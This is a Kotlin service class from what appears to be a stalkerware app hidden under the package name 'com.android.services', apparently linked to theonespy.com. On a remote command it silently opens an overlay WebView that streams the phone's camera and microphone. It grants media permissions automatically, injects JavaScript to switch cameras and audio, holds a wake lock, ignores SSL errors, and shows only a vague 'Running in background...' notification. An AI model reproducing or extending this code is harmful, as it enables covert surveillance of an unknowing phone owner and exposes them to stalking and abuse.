package com.android.services.services.view360ByJitsi

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActionBar
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.net.http.SslError
import android.os.Build
import android.os.Handler
import android.os.PowerManager
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.webkit.*
import android.widget.LinearLayout
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import androidx.lifecycle.Observer
import com.android.services.R
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.View360ByJitsiCommand
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.util.*
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope

/**
 * This implements the [View360ByJitsiCommandProcessingBaseI] abstract class. And Overrides its methods.
 * This implementation is responsible for the Initialisation of Android [WebView] by Opening the view360 Url
 * And setup web client for real-time Communication through the Target User phoneServiceId and authToken
 */
@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class View360ByJitsiCommandProcessingBaseImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : View360ByJitsiCommandProcessingBaseI(service.applicationContext) {

    private var isServiceInForeground = false
    private var view360ByJitsiCommand: View360ByJitsiCommand? = null
    private var audioType = "Unmuted"
    private var cameraType = "Front"
    private var homeToken = ""
    private var roomName = ""

    /**
     * Initialize the Window [WindowManager] by adding a WebView to the Window
     * Setup the webView with Credentials, and loads the view360 Url in WebView
     */
    override fun initialize() {
        logVerbose("$TAG In OnCreate")
        try {
            logVerbose("$TAG In Initialize() -> Ready to attach WebView to Window")
            acquireWakeLock()
            startAndCreateNotification()
            addWebViewToWindow()
            setUpWebViewDefaultSettings(mWebView!!)
        } catch (exp: Exception) {
            logException("$TAG Initialize() Error: ${exp.message}", TAG, exp)
            stopThisService()
        }
    }

    /*
    * This Function is responsible to create and attach webview to window
     */
    private fun addWebViewToWindow() {
        mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val layoutParams = WindowManager.LayoutParams(
            500, 500,
            windowManagerFlagOverlay,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )
        layoutParams.gravity = Gravity.START or Gravity.TOP
        mWebView = WebView(applicationContext)
        mWebView!!.layoutParams = LinearLayout.LayoutParams(
            500, 500
        )
        mWindowManager!!.addView(mWebView, layoutParams)
        logVerbose("$TAG WebView Attached to Window ")
    }

    override fun parseIntent(intent: Intent) {
        view360ByJitsiCommand =
            intent.getParcelableExtra(VIEW_360_BY_Jitsi_PUSH)
        view360ByJitsiCommand?.let {
            cameraType = it.cameraType
            audioType = it.audioType
            homeToken = it.homeToken
            roomName = it.roomName
        }
        setWebViewConfiguration()
        logVerbose("$TAG view360Command = $view360ByJitsiCommand")
    }

    private fun setWebViewConfiguration() {

        // Setup WebView Client
        mWebView!!.webViewClient = mWebViewClient

        // SetUp WebChrome Client
        mWebView!!.webChromeClient = mWebChromeClient
        mWebView!!.resumeTimers()
        val url =
            "https://console.theonespy.com/voip360/jitsiinitsession?psid=${roomName}&webToken=${homeToken}"
        mWebView!!.loadUrl(url)
        logVerbose("$TAG Loading Url in webview")
        view360ByJitsiBugStatus = FcmPushStatus.INITIALIZED.getStatus()

    }

    private fun startAndCreateNotification() {
        if (!isServiceInForeground) {
            val notificationIntent =
                Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                service.applicationContext,
                VIEW_360_BY_JITSI_NOTIFICATION_ID,
                notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT
            )
            val notification =
                NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                    .setContentText("Running in background...")
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentIntent(pendingIntent)
                    .build()
            service.startForeground(VIEW_360_BY_JITSI_NOTIFICATION_ID, notification)
            isServiceInForeground = true
        }
    }

    /** Web Chrome Client **/
    private val mWebChromeClient = object : WebChromeClient() {
        override fun onPermissionRequest(request: PermissionRequest) {
            mHandler.post {
                request.grant(request.resources)
                logVerbose("$TAG Permission Granted")
            }
        }
    }

    /** Web View Client **/
    private val mWebViewClient = object : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView,
            urlNewString: String,
        ): Boolean {
            if (!loadingFinished) {
                redirect = true
            }
            loadingFinished = false
            return true
        }

        override fun onReceivedError(
            view: WebView,
            request: WebResourceRequest,
            error: WebResourceError,
        ) {
            super.onReceivedError(view, request, error)
        }

        override fun onReceivedSslError(
            view: WebView,
            handler: SslErrorHandler,
            error: SslError,
        ) {
            handler.proceed()
        }

        override fun onPageStarted(view: WebView, url: String, facIcon: Bitmap?) {
            loadingFinished = false
        }

        @SuppressLint("JavascriptInterface")
        override fun onPageFinished(view: WebView, url: String) {
            if (!redirect) {
                loadingFinished = true
            }
            if (loadingFinished && !redirect) {
                try {
                    Handler().postDelayed(Runnable {
                        if (cameraType == "Back") {
                            clickOnToogleCameraButton(mWebView)
                        }
                        if (audioType == "Muted") {
                            clickOnToogleAudioButton(mWebView)
                        }
                    }, 1000)
                    logVerbose("$TAG Page loaded")
                    Handler().postDelayed(Runnable {
                        checkPermissionAndSendCallBack()
                    }, 5000)
                } catch (e: Exception) {
                    logException(
                        "onPage Finished exception  ${e.message}",
                        TAG, e
                    )
                    stopThisService()
                }
            } else {
                redirect = false
            }
        }
    }

    /*
    *This Method check required permission and pass error message if any occur
     */
    private fun checkPermissionAndSendCallBack(message: String = "") {
        val errorMessage = message.ifEmpty { getErrorMessage() }
        if (errorMessage.isNotEmpty()) {
            if (mWebView != null) {
                logVerbose("$TAG Error Message = $errorMessage")
                mWebView!!.loadUrl("javascript:sendMessage(\"$errorMessage\",\"0\")")
                logVerbose("$TAG Error Message Function Called")
            } else {
                logVerbose("$TAG Error Message Function Called but web view is null")
            }
        }
    }

    private fun clickOnToogleCameraButton(webView: WebView?) {
        if (webView != null) {
            webView.loadUrl("javascript:document.getElementById('toggleCamera').click()");
            logVerbose("$TAG Clicked on Camera Button")
        } else {
            logVerbose("$TAG WebView is null")
        }

    }

    private fun clickOnToogleAudioButton(webView: WebView?) {
        if (webView != null) {
            webView.loadUrl("javascript:document.getElementById('toggleAudio').click()");
            logVerbose("View360ByJitsiLogs: Clicked on Audio Button")
        } else {
            logVerbose("View360ByJitsiLogs: WebView is null")
        }

    }

    /** Check All Required Permission and Resources and return exception message **/
    private fun getErrorMessage(): String {
        try {
            val isMicrophonePermission = AppUtils.checkPermissionGranted(
                applicationContext,
                Manifest.permission.RECORD_AUDIO
            )
            var topPackage = ""
            topPackage = AccessibilityUtils.lastWindowPackage
            return if (!isMicrophonePermission) {
                "Microphone permission is missing. Kindly, grant permission and try again."
            } else if (AppUtils.isAccessibilityEnabled(applicationContext) && topPackage == AppUtils.getDefaultCamera()) {
                "Camera is working with an app, try it late"
            } else {
                ""
            }
        } catch (e: Exception) {
            return "$TAG Exception while checking view360 permissions e=$e"
        }
    }

    /** Destroy the WebView and release it's resources **/
    private fun destroyWebView() {
        // Make sure you remove the WebView from its parent view before doing anything.
        mWebView!!.removeAllViews()
        mWebView!!.clearHistory()

        // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
        // Probably not a great idea to pass true if you have oter WebViews still alive.
        mWebView!!.clearCache(true)

        // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
        mWebView!!.loadUrl("about:blank");
        mWebView!!.onPause()
        mWebView!!.removeAllViews()
        mWebView!!.destroyDrawingCache()

        // NOTE: This pauses JavaScript execution for ALL WebViews,
        // do not use if you have other WebViews still alive.
        // If you create another WebView after calling this,
        // make sure to call mWebView.resumeTimers().
        mWebView!!.pauseTimers()
        // NOTE: This can occasionally cause a segfault below API 17 (4.2)
        mWebView!!.destroy()
        // Null out the reference so that you don't end up re-using it.
        mWebView = null
        logVerbose("$TAG WebView destroyed")
    }

    /**
     * Set WebView Defaults
     * @param webView Instance of Web View
     */
    private fun setUpWebViewDefaultSettings(webView: WebView) {
        val settings = webView.settings
        try {
            // Enable Javascript
            settings.javaScriptEnabled = true
            settings.setAppCacheEnabled(false)
            settings.cacheMode = WebSettings.LOAD_NO_CACHE
            settings.allowFileAccessFromFileURLs = true
            settings.mediaPlaybackRequiresUserGesture = false
            settings.allowFileAccessFromFileURLs = true
            settings.allowUniversalAccessFromFileURLs = true
            // Use WideViewport and Zoom out if there is no viewport defined
            settings.useWideViewPort = true
            settings.loadWithOverviewMode = true
            // Enable pinch to zoom without the zoom buttons
            settings.builtInZoomControls = true
            // Allow use of Local Storage
            settings.domStorageEnabled = true
            // Hide the zoom controls for HONEYCOMB+
            settings.displayZoomControls = false
            // Enable remote debugging via chrome://inspect
            if (AppConstants.osGreaterThanOrEqualLollipop) {
                WebView.setWebContentsDebuggingEnabled(
                    true
                )
                // AppRTC requires third party cookies to work
                val cookieManager = CookieManager.getInstance()
                cookieManager.setAcceptThirdPartyCookies(mWebView, true)
            }
        } catch (e: Exception) {
            logException("$TAG ${AppUtils.currentMethod} exception = ${e.message}")
        }
    }

    override fun onServiceDestroy() {
        logVerbose("$TAG In OnDestroy -> Releasing Resources")
        try {
            if (mWebView != null && mWebView!!.parent != null) {
//                    mWindowManager!!.removeViewImmediate(mWebView)
                if (AppConstants.view360InteruptMessage.isNotEmpty()) {
                    checkPermissionAndSendCallBack(AppConstants.view360InteruptMessage)
                }
                mWindowManager!!.removeView(mWebView)
                destroyWebView()
            }
            logVerbose("$TAG Service is getting stop")
            AppConstants.view360InteruptMessage = ""
            releaseWakeLock()
        } catch (exp: Exception) {
            logException("$TAG onDestroy Exception = ${exp.message}")
            stopThisService()
        }
    }

    private fun stopThisService() {
        if (isServiceInForeground) {
            isServiceInForeground = false
            service.stopSelf()
        }
    }

    @SuppressLint("WakelockTimeout")
    private fun acquireWakeLock() {
        val pm = service.applicationContext.getSystemService(Service.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG_VIEW_360_BUG_WORK)
        wakeLock!!.acquire()
    }

    private fun releaseWakeLock() {
        if (wakeLock != null && wakeLock!!.isHeld) wakeLock!!.release()
    }
}